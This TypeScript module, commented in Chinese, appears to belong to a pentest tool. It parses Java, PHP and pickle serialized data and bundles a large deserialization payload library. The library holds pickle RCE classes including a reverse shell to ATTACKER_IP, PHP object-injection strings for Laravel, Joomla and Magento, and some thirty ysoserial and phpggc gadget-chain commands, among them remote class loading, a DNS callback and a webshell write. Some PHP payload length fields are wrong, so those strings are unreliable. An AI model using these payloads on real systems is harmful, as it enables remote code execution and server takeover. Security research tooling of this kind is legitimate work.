/**
 * 反序列化分析引擎
 *
 * 支持三种主要反序列化格式的分析和操作：
 * 1. Java 序列化数据检测与解析（magic bytes: aced0005）
 * 2. PHP 序列化/反序列化（支持 string/integer/boolean/array/null/object）
 * 3. Python Pickle 检测与参考信息
 *
 * 同时包含 20+ 条真实 Gadget Chain 参考数据（ysoserial 等工具链）
 */

// ============================================================
// Gadget Chain 数据结构
// ============================================================

/** Gadget Chain 信息接口 */
export interface GadgetChain {
    id: string
    name: string
    /** 目标语言：java / php / python / dotnet */
    language: string
    /** 依赖库/框架 */
    library: string
    /** 链的描述 */
    description: string
    /** 关联 CVE 编号 */
    cve?: string
    /** 示例 payload 或生成命令 */
    payload?: string
}

// ============================================================
// Java 序列化分析
// ============================================================

/** Java 序列化数据的 magic bytes（十六进制） */
const JAVA_MAGIC = "aced0005"

/**
 * 检测给定的十六进制字符串是否为 Java 序列化数据
 * Java 序列化流以 magic bytes 0xAC 0xED 开头，后接版本号 0x00 0x05
 *
 * @param hex - 十六进制字符串（支持有无空格分隔）
 * @returns 是否为 Java 序列化数据
 */
export function detectJavaSerialized(hex: string): boolean {
    const cleaned = hex.replace(/\s+/g, "").toLowerCase()
    return cleaned.startsWith(JAVA_MAGIC)
}

/**
 * Java 序列化流中的 TypeCode 常量
 * 参考: https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html
 */
const TC = {
    NULL: 0x70,
    REFERENCE: 0x71,
    CLASSDESC: 0x72,
    OBJECT: 0x73,
    STRING: 0x74,
    ARRAY: 0x75,
    CLASS: 0x76,
    BLOCKDATA: 0x77,
    ENDBLOCKDATA: 0x78,
    RESET: 0x79,
    BLOCKDATALONG: 0x7a,
    EXCEPTION: 0x7b,
    LONGSTRING: 0x7c,
    PROXYCLASSDESC: 0x7d,
    ENUM: 0x7e,
} as const

/**
 * 解析 Java 序列化数据的基本信息
 * 仅做浅层解析：提取版本号、顶层类名和字段数量
 * 不执行完整反序列化（避免安全风险）
 *
 * @param hex - 十六进制字符串
 * @returns 解析结果，包含版本、类名、字段列表
 */
export function parseJavaSerializedInfo(hex: string): {
    version: number
    className: string
    fields: string[]
} {
    const cleaned = hex.replace(/\s+/g, "").toLowerCase()

    if (!cleaned.startsWith(JAVA_MAGIC)) {
        throw new Error("不是有效的 Java 序列化数据（缺少 magic bytes ACED0005）")
    }

    const bytes = hexToBytes(cleaned)
    // magic(2) + version(2) = 偏移从 4 开始
    const version = (bytes[2] << 8) | bytes[3]
    let offset = 4

    let className = ""
    const fields: string[] = []

    try {
        // 读取 typeCode
        if (offset < bytes.length) {
            const tc = bytes[offset]
            offset++

            if (tc === TC.OBJECT) {
                // TC_OBJECT 后跟 classDesc
                if (offset < bytes.length && bytes[offset] === TC.CLASSDESC) {
                    offset++ // 跳过 TC_CLASSDESC
                    // 读取类名长度（2 字节 big-endian）
                    const nameLen = (bytes[offset] << 8) | bytes[offset + 1]
                    offset += 2
                    // 读取类名（UTF-8）
                    className = bytesToUtf8(bytes, offset, nameLen)
                    offset += nameLen
                    // 跳过 serialVersionUID（8 字节）
                    offset += 8
                    // classDescFlags（1 字节）
                    offset += 1
                    // 字段数量（2 字节）
                    if (offset + 1 < bytes.length) {
                        const fieldCount = (bytes[offset] << 8) | bytes[offset + 1]
                        offset += 2
                        // 尝试读取字段
                        for (let i = 0; i < fieldCount && offset < bytes.length; i++) {
                            const typeCode = String.fromCharCode(bytes[offset])
                            offset++
                            const fNameLen = (bytes[offset] << 8) | bytes[offset + 1]
                            offset += 2
                            const fName = bytesToUtf8(bytes, offset, fNameLen)
                            offset += fNameLen
                            fields.push(`${typeCode} ${fName}`)
                            // 如果类型是 L（对象）或 [（数组），还需跳过类名引用
                            if (typeCode === "L" || typeCode === "[") {
                                if (offset < bytes.length) {
                                    const refTc = bytes[offset]
                                    offset++
                                    if (refTc === TC.STRING) {
                                        const refLen = (bytes[offset] << 8) | bytes[offset + 1]
                                        offset += 2 + refLen
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    } catch {
        // 解析异常时返回已获取的部分信息
    }

    return { version, className, fields }
}

// ============================================================
// PHP 序列化/反序列化
// ============================================================

/**
 * 将 JavaScript 对象转为 PHP 序列化格式字符串
 *
 * 支持类型映射：
 * - string  → s:length:"value";
 * - number  → i:value; (取整) 或 d:value; (浮点)
 * - boolean → b:0; / b:1;
 * - null    → N;
 * - array   → a:size:{...}
 * - object  → a:size:{...}（作为关联数组处理）
 *
 * @param obj - 要序列化的值
 * @returns PHP 序列化字符串
 */
export function phpSerialize(obj: any): string {
    if (obj === null || obj === undefined) {
        return "N;"
    }
    if (typeof obj === "boolean") {
        return `b:${obj ? 1 : 0};`
    }
    if (typeof obj === "number") {
        if (Number.isInteger(obj)) {
            return `i:${obj};`
        }
        return `d:${obj};`
    }
    if (typeof obj === "string") {
        return `s:${obj.length}:"${obj}";`
    }
    if (Array.isArray(obj)) {
        let result = `a:${obj.length}:{`
        obj.forEach((item, index) => {
            result += phpSerialize(index) + phpSerialize(item)
        })
        result += "}"
        return result
    }
    if (typeof obj === "object") {
        const keys = Object.keys(obj)
        let result = `a:${keys.length}:{`
        keys.forEach(key => {
            result += phpSerialize(key) + phpSerialize(obj[key])
        })
        result += "}"
        return result
    }
    return "N;"
}

/**
 * 解析 PHP 序列化字符串为 JavaScript 对象
 *
 * 支持类型：
 * - s:len:"str";  → string
 * - i:num;        → number
 * - d:num;        → number (float)
 * - b:0/1;        → boolean
 * - N;            → null
 * - a:size:{...}  → object/array
 * - O:len:"cls":size:{...} → object（保留 __className）
 *
 * @param str - PHP 序列化字符串
 * @returns 解析后的 JavaScript 值
 */
export function phpUnserialize(str: string): any {
    let pos = 0

    /** 读取到指定字符为止 */
    const readUntil = (char: string): string => {
        const start = pos
        while (pos < str.length && str[pos] !== char) pos++
        return str.substring(start, pos)
    }

    /** 递归解析入口 */
    const parse = (): any => {
        if (pos >= str.length) {
            throw new Error("意外的数据末尾")
        }

        const type = str[pos]

        // null 类型
        if (type === "N") {
            pos += 2 // N;
            return null
        }

        // boolean 类型
        if (type === "b") {
            pos += 2 // b:
            const val = str[pos] === "1"
            pos += 2 // 0/1;
            return val
        }

        // integer 类型
        if (type === "i") {
            pos += 2 // i:
            const val = readUntil(";")
            pos++ // ;
            return parseInt(val, 10)
        }

        // double/float 类型
        if (type === "d") {
            pos += 2 // d:
            const val = readUntil(";")
            pos++ // ;
            return parseFloat(val)
        }

        // string 类型
        if (type === "s") {
            pos += 2 // s:
            const lenStr = readUntil(":")
            pos++ // :
            const len = parseInt(lenStr, 10)
            pos++ // "
            const val = str.substring(pos, pos + len)
            pos += len
            pos += 2 // ";
            return val
        }

        // array 类型
        if (type === "a") {
            pos += 2 // a:
            const sizeStr = readUntil(":")
            pos++ // :
            const size = parseInt(sizeStr, 10)
            pos++ // {
            const result: Record<string, any> = {}
            let isSequential = true
            for (let i = 0; i < size; i++) {
                const key = parse()
                const value = parse()
                if (key !== i) isSequential = false
                result[key] = value
            }
            pos++ // }
            // 如果所有 key 都是从 0 开始的连续整数，则返回数组
            if (isSequential && size > 0) {
                return Object.values(result)
            }
            return result
        }

        // object 类型（O:classNameLen:"className":fieldCount:{...}）
        if (type === "O") {
            pos += 2 // O:
            const clsLenStr = readUntil(":")
            pos++ // :
            const clsLen = parseInt(clsLenStr, 10)
            pos++ // "
            const className = str.substring(pos, pos + clsLen)
            pos += clsLen
            pos++ // "
            pos++ // :
            const fieldCountStr = readUntil(":")
            pos++ // :
            const fieldCount = parseInt(fieldCountStr, 10)
            pos++ // {
            const obj: Record<string, any> = { __className: className }
            for (let i = 0; i < fieldCount; i++) {
                const key = parse()
                const value = parse()
                obj[String(key)] = value
            }
            pos++ // }
            return obj
        }

        throw new Error(`不支持的 PHP 序列化类型: ${type}（位置 ${pos}）`)
    }

    return parse()
}

// ============================================================
// Python Pickle 检测
// ============================================================

/** Pickle 协议版本与 magic bytes 对照 */
export const PICKLE_MAGIC_BYTES: Record<string, string> = {
    "8001": "Pickle v1",
    "8002": "Pickle v2",
    "8003": "Pickle v3",
    "8004": "Pickle v4",
    "8005": "Pickle v5",
}

/**
 * 检测十六进制字符串是否为 Python Pickle 数据
 *
 * Pickle v2+ 以 0x80 开头，后接版本号字节
 * Pickle v0/v1 可以是文本协议（以 ( 或其他 opcode 开头）
 *
 * @param data - 十六进制字符串
 * @returns 是否为 Pickle 数据
 */
export function detectPickle(data: string): boolean {
    const cleaned = data.replace(/\s+/g, "").toLowerCase()
    // 检测 v2+ 的 \x80\x0X 头
    if (cleaned.length >= 4 && cleaned.substring(0, 2) === "80") {
        const versionByte = parseInt(cleaned.substring(2, 4), 16)
        return versionByte >= 0 && versionByte <= 5
    }
    // v0 协议：以 ( 开头（0x28）
    if (cleaned.startsWith("28")) return true
    // 以 . 结尾（0x2e 是 STOP opcode）
    if (cleaned.endsWith("2e")) return true
    return false
}

/**
 * Pickle opcode 参考表
 * 列出常见 opcode 及其含义，用于安全审计和数据分析
 */
export const pickleOpcodeReference: { opcode: string; hex: string; description: string }[] = [
    { opcode: "MARK", hex: "28", description: "压入 mark 标记到栈" },
    { opcode: "STOP", hex: "2e", description: "停止 unpickling，栈顶为返回值" },
    { opcode: "POP", hex: "30", description: "弹出栈顶元素" },
    { opcode: "DUP", hex: "32", description: "复制栈顶元素" },
    { opcode: "FLOAT", hex: "46", description: "压入浮点数（文本格式）" },
    { opcode: "INT", hex: "49", description: "压入整数（文本格式）" },
    { opcode: "LONG", hex: "4c", description: "压入长整数（文本格式）" },
    { opcode: "NONE", hex: "4e", description: "压入 None" },
    { opcode: "REDUCE", hex: "52", description: "调用可调用对象（用于 RCE）" },
    { opcode: "STRING", hex: "53", description: "压入字符串（文本格式）" },
    { opcode: "UNICODE", hex: "56", description: "压入 Unicode 字符串" },
    { opcode: "APPEND", hex: "61", description: "追加元素到列表" },
    { opcode: "BUILD", hex: "62", description: "调用 __setstate__ 或更新 __dict__" },
    { opcode: "GLOBAL", hex: "63", description: "压入全局变量（module.name，用于 RCE）" },
    { opcode: "DICT", hex: "64", description: "从 mark 到栈顶构建字典" },
    { opcode: "GET", hex: "67", description: "从 memo 获取对象" },
    { opcode: "LIST", hex: "6c", description: "从 mark 到栈顶构建列表" },
    { opcode: "PUT", hex: "70", description: "存储对象到 memo" },
    { opcode: "SETITEM", hex: "73", description: "设置字典键值对" },
    { opcode: "TUPLE", hex: "74", description: "从 mark 到栈顶构建元组" },
    { opcode: "PROTO", hex: "80", description: "声明协议版本（v2+）" },
    { opcode: "NEWOBJ", hex: "81", description: "构建新对象（cls.__new__）" },
    { opcode: "TUPLE1", hex: "85", description: "从栈顶 1 个元素构建元组" },
    { opcode: "TUPLE2", hex: "86", description: "从栈顶 2 个元素构建元组" },
    { opcode: "TUPLE3", hex: "87", description: "从栈顶 3 个元素构建元组" },
    { opcode: "SHORT_BINUNICODE", hex: "8c", description: "压入短 Unicode 字符串（v4+）" },
    { opcode: "STACK_GLOBAL", hex: "93", description: "从栈获取 module + name（v4+，用于 RCE）" },
]

/**
 * Python Pickle RCE 参考 payload
 * 仅用于安全研究和教育目的，不实际执行
 */
export const pickleRcePayloads: { name: string; description: string; code: string }[] = [
    {
        name: "os.system",
        description: "通过 os.system 执行系统命令",
        code: `import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
payload = pickle.dumps(Exploit())`,
    },
    {
        name: "subprocess.check_output",
        description: "通过 subprocess 执行命令并获取输出",
        code: `import pickle, subprocess
class Exploit:
    def __reduce__(self):
        return (subprocess.check_output, (['id'],))
payload = pickle.dumps(Exploit())`,
    },
    {
        name: "exec + reverse shell",
        description: "通过 exec 执行反弹 shell",
        code: `import pickle
class Exploit:
    def __reduce__(self):
        return (exec, ("import socket,subprocess,os;s=socket.socket();s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])",))
payload = pickle.dumps(Exploit())`,
    },
    {
        name: "builtins.eval",
        description: "通过 eval 执行任意 Python 代码",
        code: `import pickle
class Exploit:
    def __reduce__(self):
        return (eval, ("__import__('os').system('id')",))
payload = pickle.dumps(Exploit())`,
    },
    {
        name: "手工构造 opcode",
        description: "直接使用 Pickle opcode 构造 payload（绕过黑名单）",
        code: `# 使用 GLOBAL + REDUCE opcode 构造
# \\x80\\x04  - PROTO 4
# c         - GLOBAL "os\\nsystem\\n"
# (         - MARK
# S'id'     - STRING "id"
# t         - TUPLE
# R         - REDUCE
# .         - STOP
payload = b"\\x80\\x04cos\\nsystem\\n(S'id'\\ntR."`,
    },
]

// ============================================================
// PHP 对象注入参考
// ============================================================

/** PHP 对象注入参考 payload */
export const phpInjectionPayloads: { name: string; description: string; payload: string }[] = [
    {
        name: "基本对象注入",
        description: "注入一个具有 __destruct 或 __wakeup 的对象",
        payload: `O:8:"EvilClass":1:{s:4:"cmd";s:2:"id";}`,
    },
    {
        name: "POP Chain (文件写入)",
        description: "通过 POP 链实现文件写入",
        payload: `O:9:"FileWrite":2:{s:8:"filename";s:9:"/tmp/test";s:7:"content";s:11:"<?php phpinfo();?>";}`,
    },
    {
        name: "Laravel RCE (PendingBroadcast)",
        description: "Laravel 框架 PendingBroadcast 反序列化链",
        payload: `O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"\\0*\\0events";O:28:"Illuminate\\Events\\Dispatcher":1:{s:12:"\\0*\\0listeners";a:1:{s:8:"anything";a:1:{i:0;s:6:"system";}}}s:8:"\\0*\\0event";s:2:"id";}`,
    },
    {
        name: "Magento SQLI (Zend)",
        description: "Magento/Zend 框架 SQL 注入反序列化链",
        payload: `O:32:"Zend_Db_Adapter_Pdo_Abstract":1:{s:10:"\\0*\\0config";a:1:{s:6:"dbname";s:22:"';SLEEP(5);-- -";}}`,
    },
    {
        name: "Joomla RCE",
        description: "Joomla CMS 反序列化 RCE 链",
        payload: `O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:6:"assert";s:10:"javascript";i:9999;s:8:"feed_url";s:54:"eval(base64_decode('cGhwaW5mbygpOw=='));JFactory::getConfig();exit";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}`,
    },
]

// ============================================================
// Gadget Chain 参考数据（20+ 条）
// ============================================================

/** 包含 Java / PHP / Python / .NET 的 Gadget Chain 数据 */
export const gadgetChains: GadgetChain[] = [
    // ---------- Java (ysoserial) ----------
    {
        id: "cc1",
        name: "CommonsCollections1",
        language: "java",
        library: "Apache Commons Collections 3.1",
        description: "利用 LazyMap + ChainedTransformer 实现任意命令执行，经典的 Java 反序列化漏洞链",
        cve: "CVE-2015-4852",
        payload: "java -jar ysoserial.jar CommonsCollections1 'command'",
    },
    {
        id: "cc2",
        name: "CommonsCollections2",
        language: "java",
        library: "Apache Commons Collections 4.0",
        description: "使用 PriorityQueue + TransformingComparator，针对 CC 4.0 版本的利用链",
        payload: "java -jar ysoserial.jar CommonsCollections2 'command'",
    },
    {
        id: "cc3",
        name: "CommonsCollections3",
        language: "java",
        library: "Apache Commons Collections 3.1",
        description: "通过 TrAXFilter + InstantiateTransformer 加载恶意字节码",
        payload: "java -jar ysoserial.jar CommonsCollections3 'command'",
    },
    {
        id: "cc4",
        name: "CommonsCollections4",
        language: "java",
        library: "Apache Commons Collections 4.0",
        description: "CC4 变体，使用 TreeBag + TransformingComparator 链",
        payload: "java -jar ysoserial.jar CommonsCollections4 'command'",
    },
    {
        id: "cc5",
        name: "CommonsCollections5",
        language: "java",
        library: "Apache Commons Collections 3.1",
        description: "利用 BadAttributeValueExpException 触发 toString → LazyMap 链",
        payload: "java -jar ysoserial.jar CommonsCollections5 'command'",
    },
    {
        id: "cc6",
        name: "CommonsCollections6",
        language: "java",
        library: "Apache Commons Collections 3.1",
        description: "HashSet + HashMap + TiedMapEntry + LazyMap 链，绕过部分黑名单",
        payload: "java -jar ysoserial.jar CommonsCollections6 'command'",
    },
    {
        id: "cc7",
        name: "CommonsCollections7",
        language: "java",
        library: "Apache Commons Collections 3.1",
        description: "Hashtable 碰撞触发 LazyMap.equals，不依赖 Transformer 数组",
        payload: "java -jar ysoserial.jar CommonsCollections7 'command'",
    },
    {
        id: "cb1",
        name: "CommonsBeanutils1",
        language: "java",
        library: "Apache Commons Beanutils 1.9.2 + Commons Collections",
        description: "BeanComparator + TemplatesImpl，通过属性比较触发字节码加载",
        payload: "java -jar ysoserial.jar CommonsBeanutils1 'command'",
    },
    {
        id: "spring1",
        name: "Spring1",
        language: "java",
        library: "Spring Framework (spring-core, spring-beans)",
        description: "利用 Spring MethodInvokeTypeProvider + ObjectFactoryDelegatingInvocationHandler 链",
        payload: "java -jar ysoserial.jar Spring1 'command'",
    },
    {
        id: "spring2",
        name: "Spring2",
        language: "java",
        library: "Spring Framework (spring-core, spring-aop)",
        description: "Spring AOP JdkDynamicAopProxy 链，绕过部分 Spring 版本限制",
        payload: "java -jar ysoserial.jar Spring2 'command'",
    },
    {
        id: "beanshell",
        name: "BeanShell1",
        language: "java",
        library: "BeanShell 2.0b5",
        description: "BeanShell 脚本引擎，通过 Interpreter 执行任意 BeanShell 代码",
        payload: "java -jar ysoserial.jar BeanShell1 'command'",
    },
    {
        id: "c3p0",
        name: "C3P0",
        language: "java",
        library: "C3P0 0.9.5.2",
        description: "利用 C3P0 连接池的 PoolBackedDataSource 加载远程类",
        payload: "java -jar ysoserial.jar C3P0 'http://attacker/Exploit'",
    },
    {
        id: "jboss",
        name: "JBossInterceptors1",
        language: "java",
        library: "JBoss Interceptors + JavassistWeld",
        description: "JBoss 拦截器链，利用 CDI/Weld 容器实现命令执行",
        payload: "java -jar ysoserial.jar JBossInterceptors1 'command'",
    },
    {
        id: "hibernate1",
        name: "Hibernate1",
        language: "java",
        library: "Hibernate 5.x",
        description: "Hibernate TypedValue + ComponentType 链，触发 getter 方法调用",
        payload: "java -jar ysoserial.jar Hibernate1 'command'",
    },
    {
        id: "hibernate2",
        name: "Hibernate2",
        language: "java",
        library: "Hibernate 5.x",
        description: "Hibernate2 变体，使用不同的触发路径",
        payload: "java -jar ysoserial.jar Hibernate2 'command'",
    },
    {
        id: "jdk7u21",
        name: "Jdk7u21",
        language: "java",
        library: "JDK 7u21 (无需第三方库)",
        description: "利用 JDK 自身 AnnotationInvocationHandler + TemplatesImpl，无第三方依赖",
        cve: "CVE-2013-2465",
        payload: "java -jar ysoserial.jar Jdk7u21 'command'",
    },
    {
        id: "groovy1",
        name: "Groovy1",
        language: "java",
        library: "Groovy 2.3.x",
        description: "Groovy MethodClosure + ConvertedClosure + AnnotationInvocationHandler 链",
        payload: "java -jar ysoserial.jar Groovy1 'command'",
    },
    {
        id: "rome",
        name: "ROME",
        language: "java",
        library: "ROME 1.0 (RSS/Atom feed library)",
        description: "利用 ROME ToStringBean + EqualsBean 链触发 TemplatesImpl",
        payload: "java -jar ysoserial.jar ROME 'command'",
    },
    {
        id: "urldns",
        name: "URLDNS",
        language: "java",
        library: "JDK 内置 (java.net.URL)",
        description: "无 RCE，通过 DNS 请求探测反序列化入口点（HashMap + URL）",
        payload: "java -jar ysoserial.jar URLDNS 'http://dnslog.attacker.com'",
    },

    // ---------- PHP ----------
    {
        id: "php-laravel",
        name: "Laravel PendingBroadcast",
        language: "php",
        library: "Laravel Framework",
        description: "利用 PendingBroadcast + Dispatcher 链实现 RCE",
        payload: "phpggc Laravel/RCE1 system id",
    },
    {
        id: "php-symfony",
        name: "Symfony Process",
        language: "php",
        library: "Symfony Framework",
        description: "Symfony Process 组件反序列化链，执行系统命令",
        cve: "CVE-2019-18889",
        payload: "phpggc Symfony/RCE4 system id",
    },
    {
        id: "php-guzzle",
        name: "Guzzle/FW1",
        language: "php",
        library: "Guzzle HTTP Client",
        description: "Guzzle 文件写入链，用于 webshell 植入",
        payload: "phpggc Guzzle/FW1 /var/www/html/shell.php /path/to/payload",
    },
    {
        id: "php-monolog",
        name: "Monolog/RCE1",
        language: "php",
        library: "Monolog 1.x",
        description: "Monolog 日志库 BufferHandler + StreamHandler 链",
        payload: "phpggc Monolog/RCE1 system id",
    },

    // ---------- Python ----------
    {
        id: "py-pickle-os",
        name: "Pickle os.system",
        language: "python",
        library: "Python stdlib (pickle)",
        description: "使用 __reduce__ 方法调用 os.system 实现 RCE",
        payload: `python -c "import pickle,os;print(pickle.dumps(type('X',(),{'__reduce__':lambda s:(os.system,('id',))})()))"`,
    },
    {
        id: "py-pickle-subprocess",
        name: "Pickle subprocess",
        language: "python",
        library: "Python stdlib (pickle)",
        description: "使用 __reduce__ 调用 subprocess.check_output",
        payload: `python -c "import pickle,subprocess;print(pickle.dumps(type('X',(),{'__reduce__':lambda s:(subprocess.check_output,(['id'],))})()))"`,
    },
    {
        id: "py-yaml",
        name: "PyYAML Deserialization",
        language: "python",
        library: "PyYAML",
        description: "PyYAML yaml.load 使用不安全的 Loader 导致 RCE",
        cve: "CVE-2020-1747",
        payload: `!!python/object/apply:os.system ['id']`,
    },

    // ---------- .NET ----------
    {
        id: "dotnet-typconfdelegate",
        name: "TypeConfuseDelegate",
        language: "dotnet",
        library: ".NET Framework",
        description: "利用 SortedSet + Comparison 委托混淆实现命令执行",
        payload: "ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c 'command'",
    },
    {
        id: "dotnet-textformattingrunprops",
        name: "TextFormattingRunProperties",
        language: "dotnet",
        library: "Microsoft.VisualStudio.Text.UI.Wpf",
        description: "利用 XAML 反序列化在 .NET 中执行命令",
        payload: "ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c 'command'",
    },
    {
        id: "dotnet-windowsidentity",
        name: "WindowsIdentity",
        language: "dotnet",
        library: ".NET Framework (System.Security)",
        description: "利用 WindowsIdentity + BinaryFormatter 链",
        payload: "ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c 'command'",
    },
    {
        id: "dotnet-objectdataprovider",
        name: "ObjectDataProvider",
        language: "dotnet",
        library: ".NET Framework (PresentationFramework)",
        description: "通过 ObjectDataProvider 调用 Process.Start 执行命令",
        payload: "ysoserial.exe -g ObjectDataProvider -f Json.Net -c 'command'",
    },
]

// ============================================================
// 工具函数
// ============================================================

/** 十六进制字符串转字节数组 */
function hexToBytes(hex: string): number[] {
    const bytes: number[] = []
    for (let i = 0; i < hex.length; i += 2) {
        bytes.push(parseInt(hex.substring(i, i + 2), 16))
    }
    return bytes
}

/** 从字节数组中读取 UTF-8 字符串 */
function bytesToUtf8(bytes: number[], offset: number, length: number): string {
    let result = ""
    for (let i = offset; i < offset + length && i < bytes.length; i++) {
        result += String.fromCharCode(bytes[i])
    }
    return result
}

/**
 * 获取所有支持的语言列表（用于 UI 过滤）
 */
export function getLanguages(): string[] {
    const set = new Set(gadgetChains.map(c => c.language))
    return Array.from(set).sort()
}

/**
 * 按语言过滤 Gadget Chain
 *
 * @param language - 语言标识（java/php/python/dotnet），传 "all" 返回全部
 * @returns 过滤后的 Gadget Chain 列表
 */
export function filterChainsByLanguage(language: string): GadgetChain[] {
    if (language === "all") return gadgetChains
    return gadgetChains.filter(c => c.language === language)
}

/**
 * 搜索 Gadget Chain（按名称、库、描述、CVE 匹配）
 *
 * @param keyword - 搜索关键词
 * @param chains - 要搜索的链列表（默认全部）
 * @returns 匹配的 Gadget Chain 列表
 */
export function searchChains(keyword: string, chains: GadgetChain[] = gadgetChains): GadgetChain[] {
    if (!keyword.trim()) return chains
    const lower = keyword.toLowerCase()
    return chains.filter(c =>
        c.name.toLowerCase().includes(lower) ||
        c.library.toLowerCase().includes(lower) ||
        c.description.toLowerCase().includes(lower) ||
        (c.cve || "").toLowerCase().includes(lower) ||
        c.language.toLowerCase().includes(lower),
    )
}
